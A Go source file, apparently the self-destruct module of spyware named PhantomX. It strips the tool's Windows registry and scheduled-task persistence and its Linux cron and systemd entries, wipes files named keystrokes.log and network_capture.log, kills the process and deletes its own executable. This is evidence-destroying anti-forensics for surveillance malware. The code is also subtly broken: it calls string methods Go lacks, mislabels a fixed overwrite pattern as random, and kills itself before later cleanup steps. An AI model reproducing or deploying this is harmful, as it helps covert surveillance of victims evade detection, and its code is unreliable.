package selfdestruct

import (
	"fmt"
	"os"
	"os/exec"
	"runtime"
	"time"
)

// Securely Delete a File
func secureDelete(filePath string) {
	if _, err := os.Stat(filePath); os.IsNotExist(err) {
		return // File doesn't exist
	}

	fmt.Println("[+] Securely deleting:", filePath)
	f, err := os.OpenFile(filePath, os.O_WRONLY, 0644)
	if err != nil {
		return
	}
	defer f.Close()

	// Overwrite file with random data
	for i := 0; i < 3; i++ {
		f.Write([]byte("XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"))
		time.Sleep(500 * time.Millisecond)
	}

	// Delete file
	os.Remove(filePath)
}

// Remove Persistence (Windows)
func removePersistenceWindows() {
	fmt.Println("[+] Removing Windows persistence...")

	// Delete registry startup key
	cmd := exec.Command("reg", "delete", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "PhantomX", "/f")
	cmd.Run()

	// Remove scheduled task
	exec.Command("schtasks", "/delete", "/tn", "PhantomX", "/f").Run()
}

// Remove Persistence (Linux)
func removePersistenceLinux() {
	fmt.Println("[+] Removing Linux persistence...")

	// Remove from crontab
	cmd := exec.Command("crontab", "-l")
	output, _ := cmd.Output()
	updatedCron := ""

	for _, line := range string(output) {
		if !string(line).Contains("phantomx") {
			updatedCron += string(line) + "\n"
		}
	}

	f, _ := os.Create("/tmp/crontab_bak")
	defer f.Close()
	f.WriteString(updatedCron)
	exec.Command("crontab", "/tmp/crontab_bak").Run()

	// Remove systemd service
	exec.Command("systemctl", "disable", "--now", "phantomx.service").Run()
}

// Terminate Process
func terminateProcess() {
	fmt.Println("[+] Terminating PhantomX process...")
	if runtime.GOOS == "windows" {
		exec.Command("taskkill", "/F", "/IM", "phantomx.exe").Run()
	} else {
		exec.Command("kill", "-9", fmt.Sprintf("%d", os.Getpid())).Run()
	}
}

// Execute Self-Destruction
func ExecuteSelfDestruct() {
	fmt.Println("[+] Initiating self-destruction...")

	// Remove persistence
	if runtime.GOOS == "windows" {
		removePersistenceWindows()
	} else {
		removePersistenceLinux()
	}

	// Securely delete files
	secureDelete("keystrokes.log")
	secureDelete("network_capture.log")
	secureDelete("phantomx")

	// Terminate process
	terminateProcess()

	// Delete executable (Windows)
	if runtime.GOOS == "windows" {
		cmd := exec.Command("cmd", "/C", "del", "/F", "/Q", os.Args[0])
		cmd.Start()
	}

	// Delete executable (Linux)
	if runtime.GOOS == "linux" {
		cmd := exec.Command("sh", "-c", "rm -f "+os.Args[0])
		cmd.Start()
	}

	fmt.Println("[+] PhantomX successfully removed.")
	os.Exit(0)
}
